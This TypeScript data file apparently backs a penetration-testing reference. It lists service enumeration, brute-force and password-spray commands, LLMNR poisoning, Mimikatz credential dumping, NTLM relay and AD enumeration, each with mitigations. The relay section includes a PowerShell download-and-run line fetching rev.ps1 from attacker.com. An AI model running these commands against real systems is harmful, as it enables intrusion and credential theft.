export interface AttackStep {
  title: string;
  description: string;
  code?: string;
}

export interface Tool {
  name: string;
  commands: string[];
}

export interface PentestTechnique {
  id: string;
  title: string;
  shortDescription: string;
  description: string;
  category: string;
  attackSteps: AttackStep[];
  mitigations: string[];
  methodology?: {
    steps?: string[];
    tools?: Tool[];
    commands?: string[];
  };
}

export const techniqueCategories: Record<string, string> = {
  "reconnaissance": "Reconnaissance",
  "post-exploitation": "Post-Exploitation"
};

export const techniques: PentestTechnique[] = [
  {
    id: "infrastructure-inventory",
    title: "Infrastructure Inventory",
    shortDescription: "Create a comprehensive inventory of the organization's infrastructure",
    category: "reconnaissance",
    description: `
      <p>The first step in any penetration test is to create a comprehensive inventory of the target organization's infrastructure. This includes identifying all systems, servers, networking devices, and categorizing them by IP addresses and device types.</p>
      <p>A thorough inventory helps establish the scope of testing and ensures no critical system is overlooked during the assessment process.</p>
    `,
    attackSteps: [
      {
        title: "Network Scanning",
        description: "Use network scanning tools to identify active hosts and open ports.",
        code: "nmap -sn 192.168.1.0/24 # Discover active hosts"
      },
      {
        title: "OS Detection",
        description: "Identify operating systems running on discovered hosts.",
        code: "nmap -O 192.168.1.0/24 # OS detection"
      },
      {
        title: "Service Identification",
        description: "Determine what services are running on each host and their versions.",
        code: "nmap -sV 192.168.1.0/24 # Service version detection"
      }
    ],
    mitigations: [
      "Maintain an up-to-date asset inventory",
      "Implement network segmentation to contain potential breaches",
      "Follow the principle of least privilege for all systems",
      "Disable unnecessary services and ports"
    ],
    methodology: {
      steps: [
        "Identify all systems, servers, and networking devices",
        "Separate and categorize IP addresses by device type",
        "Verify active IPs using PingInfo or AngryIPScanner"
      ]
    }
  },
  {
    id: "service-enumeration",
    title: "Service Enumeration",
    shortDescription: "Discover and analyze network services and their vulnerabilities",
    category: "reconnaissance",
    description: `
      <p>Service enumeration is the foundational phase in any penetration test, enabling the discovery of active services, exposed ports, and detailed protocol behavior. Each service represents a potential attack surfaceâ€”be it due to misconfiguration, weak credentials, outdated versions, or protocol-specific flaws.</p>
      <p>By probing these services with targeted tools and scripts, testers can extract banners, enumerate users, fingerprint versions, and often uncover vulnerabilities ripe for exploitation.</p>
      <p>This guide offers a practical, no-fluff reference for enumerating and attacking commonly exposed services across networks. Each section breaks down:</p>
      <ul>
        <li>The tools best suited for enumeration</li>
        <li>Step-by-step recon and enumeration commands</li>
        <li>Exploitation techniques (basic to advanced)</li>
        <li>Metasploit modules and brute-force methods</li>
        <li>Defensive strategies to harden the service</li>
      </ul>
    `,
    attackSteps: [
      {
        title: "1. FTP (21)",
        description: "Tools: Nmap, Hydra, ftp, Metasploit, NSE Scripts, Telnet\n\nEnumeration:\nnmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <target>\nftp <target>\ntelnet <target> 21\n\nBrute Force:\nhydra -L users.txt -P pass.txt ftp://<target>\n\nMetasploit:\nuse auxiliary/scanner/ftp/ftp_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- Anonymous login\n- Directory traversal\n- Upload shell via writable directories\n- FTP bounce",
        code: "nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <target>"
      },
      {
        title: "2. SSH (22)",
        description: "Tools: Hydra, Nmap, Metasploit, ssh-audit\n\nEnumeration:\nnmap -p 22 --script ssh2-enum-algos,ssh-hostkey <target>\nssh <user>@<target>\n\nBrute Force:\nhydra -L users.txt -P pass.txt ssh://<target>\n\nMetasploit:\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- Weak credential brute-force\n- Key reuse/pivoting\n- Hijack SSH agent",
        code: "nmap -p 22 --script ssh2-enum-algos,ssh-hostkey <target>"
      },
      {
        title: "3. Telnet (23)",
        description: "Tools: Hydra, Medusa, Telnet\n\nEnumeration:\ntelnet <target>\nnmap -p 23 --script telnet-encryption <target>\n\nBrute Force:\nhydra -L users.txt -P pass.txt telnet://<target>\n\nMetasploit:\nuse auxiliary/scanner/telnet/telnet_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- Credential sniffing\n- Auth bypass",
        code: "nmap -p 23 --script telnet-encryption <target>"
      },
      {
        title: "4. SMTP (25/587/465)",
        description: "Tools: smtp-user-enum, Nmap, Telnet, Metasploit\n\nEnumeration:\nsmtp-user-enum -M VRFY -U users.txt -t <target>\ntelnet <target> 25\n\nBrute Force:\nhydra -S -s 25 -L users.txt -P passwords.txt smtp://<target>\n\nMetasploit:\nuse auxiliary/scanner/smtp/smtp_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- VRFY/EXPN user enum\n- Spoofing, relay abuse",
        code: "smtp-user-enum -M VRFY -U users.txt -t <target>"
      },
      {
        title: "5. DNS (53)",
        description: "Tools: dig, dnsrecon, DNSenum\n\nEnumeration:\ndig axfr @<target> domain.com\ndnsrecon -d domain.com -t axfr\n\nAttacks:\n- Zone transfer\n- Subdomain brute force\n- DNS tunneling",
        code: "dig axfr @<target> domain.com"
      },
      {
        title: "6. HTTP/HTTPS (80/443)",
        description: "Tools: Nikto, Gobuster, Burp Suite, Metasploit\n\nEnumeration:\nwhatweb http://<target>\ngobuster dir -u http://<target> -w wordlist.txt\n\nBrute Force:\nhydra -L users.txt -P passwords.txt http-get://<target>\n\nMetasploit:\nuse auxiliary/scanner/http/http_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- LFI/RFI, SQLi, XSS, SSRF\n- Shell upload bypass",
        code: "gobuster dir -u http://<target> -w wordlist.txt"
      },
      {
        title: "7. SMB (139/445)",
        description: "Tools: enum4linux, CrackMapExec, Metasploit\n\nEnumeration:\nenum4linux -a <target>\nsmbclient -L //<target>/ -N\n\nBrute Force:\nhydra -L users.txt -P pass.txt smb://<target>\n\nMetasploit:\nuse auxiliary/scanner/smb/smb_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- Null sessions, relay attacks\n- EternalBlue, psexec",
        code: "enum4linux -a <target>"
      },
      {
        title: "8. LDAP (389)",
        description: "Tools: ldapsearch, CrackMapExec\n\nEnumeration:\nldapsearch -x -H ldap://<target> -b \"dc=domain,dc=com\"\n\nBrute Force:\nhydra -L users.txt -P pass.txt ldap2://<target>\n\nMetasploit:\nuse auxiliary/scanner/ldap/ldap_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- Bind bypass, enum users\n- Relay to LDAP",
        code: "ldapsearch -x -H ldap://<target> -b \"dc=domain,dc=com\""
      },
      {
        title: "9. Kerberos (88)",
        description: "Tools: impacket, Rubeus, kerbrute\n\nEnumeration:\nGetUserSPNs.py domain/user:pass@dc\nGetNPUsers.py domain.local/ -usersfile users.txt -no-pass\n\nBrute Force:\nkerbrute bruteuser -d domain.com --dc <ip> users.txt\n\nAttacks:\n- AS-REP, SPN roasting\n- Golden/Silver ticket",
        code: "GetUserSPNs.py domain/user:pass@dc"
      },
      {
        title: "10. MSSQL (1433)",
        description: "Tools: sqsh, Metasploit, CrackMapExec\n\nEnumeration:\nsqsh -S <target> -U sa\n\nBrute Force:\nhydra -L users.txt -P pass.txt mssql://<target>\n\nMetasploit:\nuse auxiliary/scanner/mssql/mssql_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- xp_cmdshell abuse\n- Linked servers",
        code: "sqsh -S <target> -U sa"
      },
      {
        title: "11. MySQL (3306)",
        description: "Tools: mysql, Metasploit\n\nEnumeration:\nmysql -h <target> -u root -p\n\nBrute Force:\nhydra -L users.txt -P pass.txt mysql://<target>\n\nMetasploit:\nuse auxiliary/scanner/mysql/mysql_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- File read/write with LOAD_FILE/OUTFILE\n- Upload UDF for RCE",
        code: "mysql -h <target> -u root -p"
      },
      {
        title: "12. RDP (3389)",
        description: "Tools: xfreerdp, Nmap, Hydra\n\nEnumeration:\nnmap -p 3389 --script rdp-ntlm-info <target>\n\nBrute Force:\nhydra -L users.txt -P pass.txt rdp://<target>\n\nMetasploit:\nuse auxiliary/scanner/rdp/rdp_login\nset RHOSTS <target>\nset USER_FILE users.txt\nset PASS_FILE pass.txt\nrun\n\nAttacks:\n- BlueKeep\n- Credential stuffing",
        code: "nmap -p 3389 --script rdp-ntlm-info <target>"
      },
      {
        title: "13. VNC (5900)",
        description: "Tools: Nmap, VNC Viewer, Hydra\n\nEnumeration:\nnmap -p 5900 --script vnc-info <target>\n\nBrute Force:\nhydra -P passwords.txt -s 5900 <target> vnc\n\nMetasploit:\nuse auxiliary/scanner/vnc/vnc_login\nset RHOSTS <target>\nset PASS_FILE passwords.txt\nrun\n\nAttacks:\n- Session hijacking\n- Screen capture with creds",
        code: "nmap -p 5900 --script vnc-info <target>"
      },
      {
        title: "14. SNMP (161)",
        description: "Tools: snmpwalk, onesixtyone\n\nEnumeration:\nsnmpwalk -v2c -c public <target>\n\nAttacks:\n- Data exfil\n- Remote config manipulation",
        code: "snmpwalk -v2c -c public <target>"
      },
      {
        title: "15. NFS (2049)",
        description: "Tools: showmount, mount\n\nEnumeration:\nshowmount -e <target>\n\nAttacks:\n- UID spoofing\n- Remote read/write",
        code: "showmount -e <target>"
      },
      {
        title: "16. RPC (111)",
        description: "Tools: rpcinfo\n\nEnumeration:\nrpcinfo -p <target>\n\nAttacks:\n- Relay NFS\n- Misconfigured services",
        code: "rpcinfo -p <target>"
      },
      {
        title: "17. WinRM (5985/5986)",
        description: "Tools: Evil-WinRM, CrackMapExec\n\nEnumeration:\ncrackmapexec winrm <target> -u users.txt -p passwords.txt\n\nAttacks:\n- RCE via Evil-WinRM\n- Post-exploitation enumeration",
        code: "crackmapexec winrm <target> -u users.txt -p passwords.txt"
      }
    ],
    mitigations: [
      "Keep all services updated with the latest security patches",
      "Use strong authentication and implement MFA where possible",
      "Disable unnecessary services and protocols",
      "Implement proper network segmentation",
      "Regular security audits and vulnerability assessments",
      "Monitor for suspicious activities and failed login attempts",
      "Use intrusion detection/prevention systems (IDS/IPS)",
      "Implement proper access controls and least privilege principle"
    ],
    methodology: {
      tools: [
        {
          name: "Nmap",
          commands: [
            "nmap -sC -sV -p- <target>",
            "nmap -A -T4 <target>",
            "nmap --script vuln <target>"
          ]
        },
        {
          name: "Hydra",
          commands: [
            "hydra -L users.txt -P pass.txt service://<target>",
            "hydra -l admin -P wordlist.txt <target> http-post-form"
          ]
        },
        {
          name: "Metasploit",
          commands: [
            "use auxiliary/scanner/service/service_login",
            "set RHOSTS <target>",
            "set USER_FILE users.txt",
            "set PASS_FILE pass.txt",
            "run"
          ]
        }
      ]
    }
  },
  {
    id: "enumerate-username",
    title: "Username Enumeration",
    shortDescription: "Discovering valid usernames in various systems and services.",
    category: "reconnaissance",
    description: `
      <p>Username enumeration is the process of discovering valid user accounts in a system or environment. This can be done through various techniques across different protocols and services.</p>
      <p>Once valid usernames are identified, they can be used in further attacks like password spraying, brute forcing, or targeted social engineering.</p>
    `,
    attackSteps: [
      {
        title: "Active Directory Username Enumeration",
        description: "Enumerate users from Active Directory services using tools like CrackMapExec.",
        code: "crackmapexec smb 192.168.1.100 --users\nldapsearch -x -h 192.168.1.100 -b \"dc=corp,dc=local\" \"(objectClass=user)\""
      },
      {
        title: "SMB Username Enumeration",
        description: "Use tools like Enum4Linux to extract user lists from SMB services, including non-AD environments.",
        code: "enum4linux -U 192.168.1.100\n# Or with Metasploit\nuse auxiliary/scanner/smb/smb_enumusers"
      },
      {
        title: "Web Application Username Enumeration",
        description: "Identify valid users through different responses in login forms or password reset functionality.",
        code: "# Using Hydra for WordPress username enumeration\nhydra -L users.txt -p Password123! http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username\""
      },
      {
        title: "Email & OSINT Enumeration",
        description: "Use open-source intelligence and email harvesting to discover organizational usernames.",
        code: "theHarvester -d example.com -b google,linkedin"
      }
    ],
    mitigations: [
      "Configure services to provide generic error messages that don't reveal if a username exists",
      "Implement rate limiting on authentication endpoints to prevent automated enumeration",
      "Disable SMB NULL sessions with <code>RestrictAnonymous=2</code> in the registry",
      "Use strong LDAP authentication controls to prevent anonymous queries",
      "Monitor for multiple failed login attempts from the same source IP address"
    ]
  },
  {
    id: "guest-user-identify",
    title: "Guest User Identification",
    shortDescription: "Techniques to identify guest user accounts on networks.",
    category: "reconnaissance",
    description: `
      <p>Guest users and accounts are often overlooked in security assessments but can provide significant attack vectors. Identifying these accounts is a crucial step in understanding the security posture of a network.</p>
      <p>Guest accounts may have unexpected privileges, outdated passwords, or might be using default credentials. They're often created for temporary access and then forgotten about, leaving them vulnerable.</p>
    `,
    attackSteps: [
      {
        title: "Active Directory Enumeration",
        description: "Check for users in the built-in Guests group or accounts with guest-like properties.",
        code: "Get-ADUser -Filter 'memberOf -RecursiveMatch \"CN=Guests,CN=Builtin,DC=domain,DC=local\"'"
      },
      {
        title: "Network Traffic Analysis",
        description: "Monitor DHCP requests to find devices with generic hostnames that may indicate guest systems.",
        code: "dhcp.option.hostname contains \"Guest\""
      },
      {
        title: "Checking Shared Folder Access",
        description: "Examine SMB sessions to identify unauthorized or guest access to shared resources.",
        code: "Get-SmbSession | Select-Object ClientComputerName, Username"
      },
      {
        title: "Using Nmap for Guest Device Discovery",
        description: "Scan the network to detect unknown or guest devices based on MAC addresses or open ports.",
        code: "nmap -sn 192.168.1.0/24 --open"
      }
    ],
    mitigations: [
      "Disable default guest accounts: <code>Net user Guest /active:no</code>",
      "Implement Network Access Control (NAC) to restrict unauthorized devices",
      "Use 802.1X authentication for network access",
      "Monitor DHCP logs for unexpected or unknown devices",
      "Enforce strong security policies for temporary accounts including automatic expiration"
    ]
  },
  {
    id: "llmnr-poisoning",
    title: "LLMNR & NBT-NS Poisoning",
    shortDescription: "Exploiting name resolution protocols to capture NetNTLM hashes.",
    category: "reconnaissance",
    description: `
      <p>LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are protocols used for name resolution when DNS fails. They're enabled by default in Windows environments and can be exploited to capture NetNTLM hashes.</p>
      <p>When a Windows machine fails to resolve a hostname via DNS, it falls back to broadcasting LLMNR and NBT-NS queries on the local network. An attacker can listen for these broadcasts and respond to them, forcing the victim to send their NetNTLM hash.</p>
    `,
    attackSteps: [
      {
        title: "Setting up Responder",
        description: "Responder by Laurent GaffiÃ© is the most popular tool for LLMNR/NBT-NS poisoning. It listens for name resolution requests and responds to them, forcing authentication.",
        code: "sudo responder -I eth0 -rv"
      },
      {
        title: "Forcing a name resolution request",
        description: "On a victim machine, attempt to connect to a non-existent share to trigger name resolution.",
        code: "net use \\\\fakehost\\share"
      },
      {
        title: "Capturing and cracking hashes",
        description: "Responder will capture NetNTLM hashes which can be cracked with tools like Hashcat.",
        code: "hashcat -m 5600 captured_hash.txt rockyou.txt --force"
      },
      {
        title: "Alternative: Using Inveigh on Windows",
        description: "For Windows environments, Inveigh provides similar functionality to Responder.",
        code: "Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -NBNS Y -LLMNR Y -HTTP N"
      }
    ],
    mitigations: [
      "Disable LLMNR via Group Policy: <code>Computer Configuration â†’ Administrative Templates â†’ Network â†’ DNS Client â†’ Turn off multicast name resolution â†’ Enabled</code>",
      "Disable NBT-NS: <code>Network Adapter Properties â†’ IPv4 Properties â†’ Advanced â†’ WINS tab â†’ Disable NetBIOS over TCP/IP</code>",
      "Enable SMB Signing to prevent relay attacks: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true</code>",
      "Implement strong password policies to make hash cracking more difficult."
    ],
    methodology: {
      tools: [
        {
          name: "Responder",
          commands: [
            "responder -I ens33 -wdrf",
            "responder -I ens33 -wd",
            "responder -I ens33 -A",
            "responder -I ens33 -wdF -b",
            "responder -I ens33 -wdF --lm --disable-ess",
            "responder -I ens33 -e 192.168.1.2"
          ]
        },
        {
          name: "Hash Cracking",
          commands: [
            "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
            "john SMB-NTLMv2-SSP-192.168.100.101.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "hashcat -m 5600 HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt /usr/share/wordlists/rockyou.txt",
            "# Online resources:",
            "# https://crackstation.net/",
            "# https://hashes.com/en/decrypt/hash"
          ]
        }
      ]
    }
  },
  {
    id: "hash-capture",
    title: "Hash Capture & Cracking",
    shortDescription: "Techniques for capturing and cracking authentication hashes",
    category: "reconnaissance",
    description: `
      <p>Hash capture involves intercepting authentication hashes from network traffic or extracting them from compromised systems. Once captured, these hashes can be cracked offline to recover plaintext passwords.</p>
      <p>Common techniques include LLMNR/NBT-NS poisoning, SMB relay attacks, and extracting hashes directly from memory or storage on compromised systems.</p>
    `,
    attackSteps: [
      {
        title: "Responder Setup",
        description: "Use Responder to capture NetNTLM hashes via LLMNR/NBT-NS poisoning.",
        code: "sudo responder -I eth0 -rdwv"
      },
      {
        title: "Hash Extraction",
        description: "Extract hashes from a compromised Windows system using Mimikatz.",
        code: "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam"
      },
      {
        title: "Offline Hash Cracking",
        description: "Use Hashcat or John the Ripper to crack the captured hashes.",
        code: "hashcat -m 1000 ntlm_hashes.txt wordlist.txt\njohn --format=netntlmv2 hashes.txt --wordlist=wordlist.txt"
      },
      {
        title: "Online Hash Lookups",
        description: "Check if the hash exists in online rainbow tables or breach databases.",
        code: "# Visit services like:\n# https://crackstation.net/\n# https://hashes.com/en/decrypt/hash"
      }
    ],
    mitigations: [
      "Disable LLMNR and NBT-NS to prevent poisoning attacks",
      "Implement network segmentation to limit the impact of hash capture",
      "Use strong password policies to make hash cracking more difficult",
      "Enable MFA wherever possible to mitigate the impact of compromised credentials",
      "Monitor for signs of hash capture attempts in network traffic"
    ],
    methodology: {
      tools: [
        {
          name: "Responder (LLMNR/NBT-NS Poisoning)",
          commands: [
            "responder -I eth0 -rv # Basic usage",
            "responder -I ens33 -wdrf",
            "responder -I ens33 -wd",
            "responder -I ens33 -wdF -b",
            "responder -I ens33 -wdF --lm --disable-ess"
          ]
        },
        {
          name: "Hash Cracking",
          commands: [
            "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
            "john SMB-NTLMv2-SSP-192.168.100.101.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "# Online resources:",
            "# https://crackstation.net/",
            "# https://hashes.com/en/decrypt/hash"
          ]
        },
        {
          name: "Leak Data Checking",
          commands: [
            "# Online resources:",
            "# https://leakcheck.io/",
            "# https://breachdirectory.org/",
            "# https://www.dehashed.com/"
          ]
        }
      ]
    }
  },
  {
    id: "ntlm-relay",
    title: "NetNTLM Relay Over SMB",
    shortDescription: "Intercepting and relaying NTLM authentication to gain unauthorized access.",
    category: "reconnaissance",
    description: `
      <p>NetNTLM relay attacks exploit Windows authentication by intercepting NTLM challenge-response authentication attempts and forwarding them to another system. This allows an attacker to authenticate to servers as the victim without knowing their password.</p>
      <p>SMB (Server Message Block) is one of the most common protocols targeted in NTLM relay attacks, especially in environments where SMB signing is not enforced.</p>
    `,
    attackSteps: [
      {
        title: "Identify Targets Without SMB Signing",
        description: "Use Nmap to scan for systems that have SMB signing disabled, making them vulnerable to relay attacks.",
        code: "nmap -p 445 --script smb2-security-mode 192.168.1.0/24"
      },
      {
        title: "Configure Responder for Relay",
        description: "Modify Responder configuration to prevent hash capture and allow relay attacks.",
        code: "# Edit /etc/responder/Responder.conf\n# Set SMB = Off\n# Set HTTP = Off\npython3 Responder.py -I eth0 -rv"
      },
      {
        title: "Set up NTLM Relay",
        description: "Use ntlmrelayx.py to relay captured NTLM authentication to target systems.",
        code: "python3 ntlmrelayx.py -tf targets.txt -smb2support"
      },
      {
        title: "Execute Commands via Relayed Authentication",
        description: "If successful, execute commands on the target system using the relayed credentials.",
        code: "python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://attacker.com/rev.ps1\\')\"'"
      }
    ],
    mitigations: [
      "Enable SMB Signing on all Windows systems: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true</code>",
      "Use LDAP signing and channel binding to prevent LDAP relay attacks",
      "Disable LLMNR and NetBIOS Name Service to prevent capturing authentication attempts",
      "Implement network segmentation to limit the impact of relay attacks",
      "Monitor for unexpected authentication attempts and SMB sessions"
    ]
  },
  {
    id: "password-attacks",
    title: "Brute Force & Password Spray",
    shortDescription: "Techniques to discover weak credentials in multiple services.",
    category: "reconnaissance",
    description: `
      <p>Password attacks attempt to discover valid credentials by either trying many passwords against a single account (brute force) or trying a few common passwords against many accounts (password spraying).</p>
      <p>Password spraying is often more effective and less likely to trigger account lockouts, as it tries a small number of common passwords across many accounts.</p>
    `,
    attackSteps: [
      {
        title: "SMB Password Spraying with Metasploit",
        description: "Use Metasploit's smb_login module to attempt common passwords against multiple SMB users.",
        code: "use auxiliary/scanner/smb/smb_login\nset RHOSTS 192.168.1.10\nset USER_FILE users.txt\nset PASSWORD Spring2024!\nset THREADS 10\nrun"
      },
      {
        title: "Password Spraying with CrackMapExec",
        description: "CrackMapExec allows for efficient password spraying across multiple protocols including SMB, WinRM, and MSSQL.",
        code: "crackmapexec smb 192.168.1.0/24 -u users.txt -p \"Welcome123!\""
      },
      {
        title: "Targeted Brute Force with Hydra",
        description: "For specific targets, Hydra can attempt multiple passwords against services like SSH, FTP, or web applications.",
        code: "hydra -L users.txt -P passwords.txt smb://192.168.1.10"
      },
      {
        title: "Avoiding Account Lockouts",
        description: "Implement delays between attempts and monitor for account lockout policies to avoid triggering security alerts.",
        code: "# Using CrackMapExec with a delay\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p common-passwords.txt --delay 5"
      }
    ],
    mitigations: [
      "Implement account lockout policies after a reasonable number of failed attempts",
      "Use multi-factor authentication (MFA) to prevent password-only attacks",
      "Enforce strong password policies with minimum complexity requirements",
      "Monitor for multiple failed login attempts from the same source",
      "Use adaptive authentication that considers login behavior and risk factors"
    ]
  },
  {
    id: "ad-enumeration",
    title: "Active Directory Enumeration",
    shortDescription: "Gathering information about Active Directory domain structure.",
    category: "reconnaissance",
    description: `
      <p>Domain enumeration is the process of gathering information about the structure, users, groups, and policies of an Active Directory domain. This is typically one of the first steps in an Active Directory penetration test.</p>
      <p>Effective domain enumeration can reveal security misconfigurations, overly permissive access controls, and potential attack vectors within the domain infrastructure.</p>
    `,
    attackSteps: [
      {
        title: "Initial Domain Discovery",
        description: "Determine the domain name and identify domain controllers.",
        code: "nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local"
      },
      {
        title: "Enumerate Domain Trusts",
        description: "Identify trust relationships between domains that could be leveraged for lateral movement.",
        code: "Get-DomainTrust\n# Or using PowerView\nGet-NetDomainTrust"
      },
      {
        title: "Identify Domain Policies",
        description: "Gather information about domain password policies and security settings.",
        code: "Get-DomainPolicy\n# Or using native commands\nnet accounts"
      },
      {
        title: "Map Domain Structure",
        description: "Use tools like BloodHound to visualize the domain structure and identify attack paths.",
        code: "# Using SharpHound\nInvoke-BloodHound -CollectionMethod All -Verbose"
      }
    ],
    mitigations: [
      "Implement least privilege access controls across the domain",
      "Regularly audit domain trusts and remove unnecessary relationships",
      "Use strong password policies and enable MFA where possible",
      "Monitor for unusual domain enumeration activities using event logs (Event IDs 4624, 4625, 4768, 4769)",
      "Segment the network to limit the scope of domain enumeration attempts"
    ],
    methodology: {
      steps: [
        "1. Getting IP",
        "2. Getting Local USER",
        "3. Getting Local USER PASSWORD",
        "4. Dump All Hashes",
        "5. Enumerate for AD User",
        "6. Enumerate for AD User Password",
        "7. Enumerate for AD Domain",
        "8. Enumerate for AD Domain Password",
        "9. Login"
      ],
      tools: [
        {
          name: "Bloodhound",
          commands: [
            "neo4j console # First start the Neo4j service",
            "bloodhound # Then open Bloodhound",
            "# On target Windows system:",
            "powershell -ep bypass",
            ".\\SharpHound.ps1",
            "Invoke-BloodHound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip"
          ]
        },
        {
          name: "Impacket",
          commands: [
            "impacket-psexec ad.domain/user:pass@IP",
            "impacket-wmiexec ad.domain/user:pass@IP",
            "impacket-secretsdump ad.domain/user:pass@IP",
            "impacket-GetADUsers ad.domain/user:pass@IP",
            "impacket-mimikatz ad.domain/user:pass@IP",
            "impacket-smbpasswd ad.domain/user:pass@IP"
          ]
        },
        {
          name: "RPCClient",
          commands: [
            "rpcclient -U ad.domain%user:pass@IP",
            "querydominfo # Domain Information Query",
            "enumdomusers # Enumerating Domain Users",
            "enumdomgroups # Enumerating Domain Groups",
            "querygroup 0x200 # Group Queries",
            "queryuser User # User Queries",
            "enumprivs # Enumerating Privileges",
            "getdompwinfo # Get Domain Password Information",
            "createdomuser hacker # Creating Domain User",
            "setuserinfo2 hacker 24 Password@1 # Set user password",
            "deletedomuser hacker # Delete Domain User",
            "netshareenumall/netshareenum # Net Share Enumeration"
          ]
        }
      ]
    }
  },
  {
    id: "smb-enumeration",
    title: "SMB Enumeration",
    shortDescription: "Techniques for enumerating SMB shares and resources",
    category: "reconnaissance",
    description: `
      <p>SMB (Server Message Block) enumeration involves gathering information about file shares, permissions, users, and other resources available via the SMB protocol on Windows systems.</p>
      <p>This information can be leveraged to identify potential attack vectors such as misconfigured shares, weak permissions, or opportunities for lateral movement within a network.</p>
    `,
    attackSteps: [
      {
        title: "Basic SMB Enumeration",
        description: "Use built-in tools to enumerate SMB shares on a target system.",
        code: "net view \\\\192.168.1.100\nnbtstat -A 192.168.1.100"
      },
      {
        title: "SMB Share Access Testing",
        description: "Test access to SMB shares to identify accessible resources.",
        code: "smbclient -L //192.168.1.100/"
      },
      {
        title: "Anonymous Share Access",
        description: "Attempt to connect to SMB shares without authentication.",
        code: "smbclient //192.168.1.100/share -N"
      },
      {
        title: "Enumerate SMB Users and Groups",
        description: "Extract user and group information from SMB services.",
        code: "enum4linux -u 'username' -p 'password' -U 192.168.1.100"
      }
    ],
    mitigations: [
      "Disable SMB if not required",
      "Configure proper share permissions using the principle of least privilege",
      "Implement network segmentation to restrict access to SMB ports (139/445)",
      "Enable SMB signing to prevent replay attacks",
      "Use strong authentication and consider requiring encryption",
      "Monitor for unusual SMB access patterns"
    ]
  }
];
